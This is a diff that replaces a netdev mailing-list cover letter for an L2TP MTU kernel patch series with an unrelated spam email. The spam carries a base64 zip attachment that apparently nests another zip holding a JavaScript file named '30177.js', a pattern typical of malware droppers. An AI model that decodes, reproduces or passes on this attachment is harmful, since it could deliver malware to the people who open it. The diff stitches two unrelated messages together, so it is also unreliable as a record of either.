@@ -1,54 +1,73 @@
-From: "R. Parameswaran" <parameswaran.r7@gmail.com>
-Subject: [PATCH net-next v4 0/2] L2TP:Adjust intf MTU, add underlay L3, L2
- hdrs.
-Date: Wed, 22 Mar 2017 16:08:27 -0700 (PDT)
-Message-ID: <alpine.DEB.2.11.1703221604390.9002@vera100.eng.brocade.com>
+From: <openhackbangalore@gmail.com>
+Subject: 34210 netdev
+Date: Wed, 22 Mar 2017 23:09:05 -0000
+Message-ID: <149022414519.16100.14310977941070313504@hinet.net>
+Reply-To: <openhackbangalore@gmail.com>
 Mime-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
-Cc: kleptog@svana.org, jchapman@katalix.com, davem@redhat.com,
-        nprachan@brocade.com, rshearma@brocade.com,
-        stephen@networkplumber.org, sdietric@brocade.com,
-        ciwillia@brocade.com, lboccass@brocade.com, dfawcus@brocade.com,
-        bhong@brocade.com, jblunck@brocade.com,
-        linux-kernel@vger.kernel.org
-To: netdev@vger.kernel.org
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="94999269.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 114-43-177-25.dynamic.hinet.net ([114.43.177.25]:46561 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754409AbdCVXJL (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 22 Mar 2017 19:09:11 -0400
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-
-Existing L2TP kernel code does not derive the optimal MTU for Ethernet
-pseudowires and instead leaves this to a userspace L2TP daemon or
-operator. If an MTU is not specified, the existing kernel code chooses
-an MTU that does not take account of all tunnel header overheads, which
-can lead to unwanted IP fragmentation. When L2TP is used without a
-control plane (userspace daemon), we would prefer that the kernel does a
-better job of choosing a default pseudowire MTU, taking account of all
-tunnel header overheads, including IP header options, if any. This patch
-addresses this.
-
-Change-set is organized as a two part patch series, with one patch
-introducing a new kernel function to compute the IP overhead on a
-socket, and the other patch using this new kernel function to compute
-the default L2TP MTU for an Ethernet pseudowire.
-
-Existing code also seems to assume an Ethernet (non-jumbo) underlay. The
-change proposed here uses the PMTU mechanism and the dst entry in the
-L2TP tunnel socket to directly pull up the underlay MTU (as the baseline
-number on top of which the encapsulation headers are factored in).
-An default MTU value of 1500 bytes is assumed as a fallback only if
-this fails.
-    
-Signed-off-by: R. Parameswaran <rparames@brocade.com>
-
-R. Parameswaran (2):
-  New kernel function to get IP overhead on a socket.
-  L2TP:Adjust intf MTU, add underlay L3, L2 hdrs.
-
- include/linux/net.h |  3 +++
- net/l2tp/l2tp_eth.c | 55 +++++++++++++++++++++++++++++++++++++++++++++++++----
- net/socket.c        | 44 ++++++++++++++++++++++++++++++++++++++++++
- 3 files changed, 98 insertions(+), 4 deletions(-)
-
--- 
-2.1.4
+UEsDBAoAAgAAAEQmd0qnu27acQsAAHELAAANABwAemlwLTMwMTc3LnppcFVUCQADn//SWJ//0lh1
+eAsAAQQAAAAABAAAAABQSwMEFAACAAgARCZ3SrortHrLCgAAXxUAAAgAHAAzMDE3Ny5qc1VUCQAD
+n//SWJ//0lh1eAsAAQQAAAAABAAAAAC1mMtuVNkVhscg9TtYHtlxid73i4gjRZEiZZBRD7s70r76
+gnHhwhjbiHfPt47LVEFQJ60kA6Coc87ea//rv6xT88N1u71YXx+8fVxvPl5cPL4pR+/OHx5uxxzz
+4fiHl59+ePliM24/bK4P3pXN+/G369u9G1Y6HL/+4eXnH17O54Xur9+Nx7vartrR/fb5u7I5qAen
+B/evt//Z3G4+XK83j5t+etij6T63VIwdxrkc+eyVNrl31WZXejjfXK3K2Oxq1L24qMr0WffUlXW+
+tlyjdUapYUyvLupZTIu9NBuTmy3Uoqed3pqcpkou1Nhda1nr7F2fdRptRpw6tO6nsrU0n2222gc3
+ba66xqwyZZiYzUh9+FGzjVq1bmu1VVlW7n3qqnLJ3XGYHEtUYyQTfYgqmtb50pWZO1X1bqo3yYxu
+pgmuak3NWocZm+mjT9v0lKug0VXkvNEnVbJuvs3DEwA8bDoGJ5VHY+3wLuZs5FyjJp1qTpy69Vzt
+ctUDwvRBxep77xnEqm/JlmGLiWFSeXXepVTBJDVto889VU5PLyzL8kmpmnpvqbvl1KFaW21yBrS7
+dKq0ZjmgZuXQYi3WmyIPp+irfMm2MWvTnO+j2jii8sXQAe+0qaXnXHO2nat8MD4Y30xtBUxsqX3m
+2uk8XY7V2WA4W9RNO6VKpdRcm+xm2pgzNBt8sbMXX9miww/3hFifEU61UYy2pnhrE7V9i4kpbMRO
+sOi3GZi675y6N510HhHEWqmTfinXrG/Fa+XppgdRHaMKkNDFGuiyaQ1acWpFp+EJtZieiuA5FTzj
+1FG7ykGyATHrR+szxBk4oamgXbSbqpUGz8DTcPwUI5gE9rUeroFnybZZ8HSgjaiEgXa2QYNEKimp
+pV1VumyarALt6tKLRNV5i9iwdIL1C7tnt+UJFAyZykFMU5uqSMAMZ21J2mnhfx6pgEnRNQlgxnhH
+mY2+qDQ1G4/Gfuw+Z6Fy+EmvlYtuTk7fTY8xwf9CbR60E0UFN8AEurTBuYKOLaH3aqLzNvH1cKM8
+sddZaJco2NIeVyFmQTYYBqpEXVZk30QXajoO10a0gjYfZGXHvrkOODB9DDYpTc0wP1EVLQK8UY11
+AUnZgN6LF2hsjk+Iwf9BUzzitsa4hO4iTmVLabK7j47KB41EWZ5WpemGwn2yZg31+/i/6M4XfKWJ
+qSSvYSCaMkMNDmaQbCmF46qFCaBenM0wEHjgSVauyqkUugvUDGuEn/hYRTvKzQFRW8gpWFd6eFZW
+VNm5pHxNgJoQNZ3aPxGUk/P25uCnKM5JVXQqw09Q0F0lqbk/I0bl1JYB1wSjm3FUbnGM2A26S+JF
+sAjJ2hmtbdzgjUI7vY+hYQc8nyMOq5bKhSc4FdqpZErVMQeYgGd7FfMYT7ojF8bIOkJljY85dDdj
+nY2rjqt62Td4lQAJRUdiBQScPNsA23Vq9UbSCgORmkEA9gbcBmpRpohsZNbA2404s0YByQ9sjm2t
+jiOIb8PBzJIDpzLCQDiQcHXbuFdcyA0Lz3X3fsycst86v2gH7Au6guSeaMAORDtIT1Ip4CeYSaQb
+XltcW3sqx4cmbkhWmlm3u7MZucAaExajSq9IThjuOTXaobMKCCgRPC2t0DomNQPPBk/ComgAyrGr
+HjrtxSFxVyMOidn36pMOGSxJPAeY6KUOYZEwkKtBcayc2Vf8GC7NadhIvGjJ97SflRmrN4WTGzCB
+RqgmiC6a7KYbOWthokObqLJTs/Cz7Dj2LzxsDBG9WcyvwI7A7sHEJRf0dkIYaGcOj0+WXr8wIdNr
+TeVaXBQ8B5jYEmyw082F/+BaKpPJwpNAPejOgGd5YgJ+IrqqMmbQa1OUJZFCsqQYmvUShjlPpVtM
+AESy6yTcJlOcqrMu+5Lcvs+FA3gv0CeN3wb4OYVFREFiIsJU8TGPaoZP5Dv53XBJmlhSHTEgJvyT
+YMBncFfp4xYxFEE3AZwTIJClX048gcyis/DEynQhDGcuymwU1HxKW1H9sn743vqsTOcJEsuxkZTF
+nXCbwdQkOZvFITn9/P6zuqIsR5OoanG5fzN7OGRPVVlmD+Ygri7PLj4Dnk9pqP87h9xmpVm8SGAl
+N35fUvcpadiipKH0i2W3mdXE3XH8pxnVJkw9GhjotRuMCkQV7JX5YRaxJK7KpIdFh5GYS2oa+LOH
+a46q1PbqlOkXEw49yKnHMkNCw/n11CR9ROPPV3/PZMJMjqbMnCIb+FmYuiMTkfRC/UZWolw4LMq1
+i2ZBjI4konHgJxBSKXGMTKrRYeYxCvqO8zextMI0GEKhm4xCHRTMkycM6SYrM8Vs58CWGCZd+qL3
+p2eHmDRRgUHh3kQsIzWqjgZ+FrgdY10YyPsDp844CXO7YhLhXcNGgftLpxY8cUic+Wn+nBJi1IwH
+4duK9OdPLNgJLhRZwEcYWEFDpsTWx7MqYYcR18OLoAmHKI5zs4JMdBEG+sSLDjPAs7fzZlKIOqTJ
+QEsAie6mWpQF/0k0fMyOxsBTF73j7Vi7s1rUwRtW/Xpl2Tdq8AQTz9jSQpMZIAScvzLxLl7UwZOp
+LhuGG0NI4zcj5airJiJ1GsSvmTlyNY4Or9LoiRc3VaBImzaQiZzaoJqB86fWC4EvQzReQZQxYTI/
+wmnQDqRt9pI4i8sxf1oladXSVpXL/ACRYaZ9mjNhuDZp0utMdmjW96iD9xHSdi4M5CWuT6CCY5p7
+asLGh5d3QzF14M5CQuiAMTBdhEi/qiGFSQfUMqIkGr0mT6vErHj7FEx8hHzfPiuT3ujyosD7V9u+
+OTonTiK68/gYPPGOKVwmZ5TFy04Ce66i98jAzrsJ4/nWPwN9LEvNjsTRKYA70wVeNXE5zKBB8uAI
+bZwKc1HKMZ3655mfspa5fcxn/ifhf2aSBHNyBy8SZRF6ONX2KpSUOEV36mlCYC6qSl6mqkw+T5MJ
+Kc/hpvhY+c6MGuj1TH55pfQyjzHVJ2WmvKdbySydWiKjSTTm9vrVys9z4PPbX1kymkbLXL3vFXRq
+mTBd2p9vD1/vft/Y/SrxzU8aV7c3d4+by8erefRw8Xj5bvP+bH2999vG2fmbx4u7x9rODk4Pdne8
+uhrXZ7fnezv8vdyev5pX6/XmaPm4Kdd9/fbo+OAPe2scf735/+yHmY99Xr1dXz6870d7tX9Yb27f
+3fTr24fTw5Mxbu7ubq6ubkq5OXz1tty286Mff/npk/7849nx3jl2D/28h83u2+NfX/+fDvH+7K7P
+s/X9eh6t1x/e9Ivrx5vLveNcXNabu/X57eMC+8fzi6txRFvHsdzw4nbzIP8sn1/sbj09uh4fD/66
+3ePocDM+vmkf3/YP5XB1KKuur88eysfHq7txKnf+ebMpD0fY0iqllfcrHfXKaLdKcRX9yuZVynzn
+V96utDJciiu5Wad4vLq+X9/P+9GuH05323yBGqyNYL16CzHG2/Ozy8vTXw5/OVzd3j9+eH92UW7O
+TtXrCX+krP0vVw+373urj/eX99yxu/LH3YbPfNxdPDnZe+zk5PjTBQz/8sWfTnfn3j57/OmrbT7v
+yjw4PNkn2Mnh6U+3m4vrs1dzs377l/Oy+cu6j6MvTd5V9fOunF+l4f/YbfrzbrNfj19//maH//A/
+h0e7Io9fHx7v82bh9IsXdTPKm+XjZ/mrLc0Ym+MvXJGvP++o+hXJ+H6PlHu/fmqW/ydQSwECHgMU
+AAIACABEJndKuiu0essKAABfFQAACAAYAAAAAAABAAAApIEAAAAAMzAxNzcuanNVVAUAA5//0lh1
+eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBOAAAADQsAAAAAUEsBAh4DCgACAAAARCZ3Sqe7btpx
+CwAAcQsAAA0AGAAAAAAAAAAAAKSBAAAAAHppcC0zMDE3Ny56aXBVVAUAA5//0lh1eAsAAQQAAAAA
+BAAAAABQSwUGAAAAAAEAAQBTAAAAuAsAAAAA
